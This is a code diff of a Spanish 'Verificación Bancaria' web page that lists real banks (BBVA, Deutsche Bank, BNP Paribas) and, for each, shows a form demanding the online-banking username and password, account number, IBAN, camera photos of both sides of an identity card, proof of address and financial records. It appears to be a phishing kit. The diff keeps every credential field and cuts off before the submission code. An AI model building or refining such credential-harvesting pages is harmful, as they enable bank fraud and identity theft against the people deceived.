@@ -6,8 +6,6 @@
   <style>
     body { font-family: Arial; background: #f4f6f9; margin: 20px; }
     h1 { text-align: center; color: #003366; }
-    .search-box { text-align: center; margin: 20px; }
-    input[type="text"], input[type="password"] { padding: 8px; width: 300px; }
     .accordion { background: #fff; border: 1px solid #ccc; border-radius: 5px; margin: 10px auto; width: 420px; }
     .accordion-header { padding: 15px; cursor: pointer; background: #e6f0ff; font-weight: bold; }
     .accordion-content { display: none; padding: 15px; }
@@ -20,22 +18,22 @@
 
 <h1>Verificación Bancaria</h1>
 
-<div class="search-box">
-  <input type="text" id="searchInput" placeholder="Buscar país o banco...">
-</div>
-
 <div id="accordionList"></div>
 
 <div id="confirmationBox">
   ✔ Datos enviados correctamente
 </div>
 
-<script src="lista.js"></script>
 <script>
-const destacados = ["España", "Alemania", "Francia", "Reino Unido", "Italia"];
+// Lista de bancos de ejemplo
+const bancosIBAN = [
+  {pais:"España", banco:"BBVA"},
+  {pais:"Alemania", banco:"Deutsche Bank"},
+  {pais:"Francia", banco:"BNP Paribas"}
+];
+
 const accordionList = document.getElementById("accordionList");
 
-// Crear acordeones
 bancosIBAN.forEach(item => {
   const acc = document.createElement("div");
   acc.className = "accordion";
@@ -44,43 +42,18 @@ bancosIBAN.forEach(item => {
     <div class="accordion-header">${item.pais} - ${item.banco}</div>
     <div class="accordion-content">
       <form onsubmit="guardarDatos(event)">
-        <label>Usuario:
-          <input type="text" name="usuario" required>
-        </label>
-
-        <label>Contraseña:
-          <input type="password" name="password" required>
-        </label>
-
-        <label>Cuenta principal:
-          <input type="text" name="cuenta" required>
-        </label>
-
-        <label>IBAN:
-          <input type="text" name="iban" required>
-        </label>
-
-        <label>Foto carnet (frontal):
-          <input type="file" name="frontal" accept="image/*" capture="camera" required>
-        </label>
-
-        <label>Foto carnet (trasera):
-          <input type="file" name="trasera" accept="image/*" capture="camera" required>
-        </label>
-
-        <label>Comprobante de domicilio:
-          <input type="file" name="domicilio" accept="image/*,application/pdf" capture="camera" required>
-        </label>
-
-        <label>Justificantes financieros:
-          <input type="file" name="finanzas" accept="image/*,application/pdf" capture="camera" required>
-        </label>
-
+        <label>Usuario: <input type="text" name="usuario" required></label>
+        <label>Contraseña: <input type="password" name="password" required></label>
+        <label>Cuenta principal: <input type="text" name="cuenta" required></label>
+        <label>IBAN: <input type="text" name="iban" required></label>
+        <label>Foto carnet (frontal): <input type="file" name="frontal" accept="image/*" capture="camera" required></label>
+        <label>Foto carnet (trasera): <input type="file" name="trasera" accept="image/*" capture="camera" required></label>
+        <label>Comprobante de domicilio: <input type="file" name="domicilio" accept="image/*,application/pdf" capture="camera" required></label>
+        <label>Justificantes financieros: <input type="file" name="finanzas" accept="image/*,application/pdf" capture="camera" required></label>
         <button type="submit">Verificar</button>
       </form>
     </div>
   `;
-  acc.style.display = destacados.includes(item.pais) ? "" : "none";
   accordionList.appendChild(acc);
 });
 
@@ -90,15 +63,6 @@ document.addEventListener("click", e => {
     const content = e.target.nextElementSibling;
     content.style.display = content.style.display === "block" ? "none" : "block";
   }
-});
-
-// Búsqueda
-document.getElementById("searchInput").addEventListener("keyup", function() {
-  const filter = this.value.toLowerCase();
-  document.querySelectorAll(".accordion").forEach(acc => {
-    const text = acc.querySelector(".accordion-header").textContent.toLowerCase();
-    acc.style.display = text.includes(filter) ? "" : "none";
-  });
 });
 
 // Convertir archivo a Base64
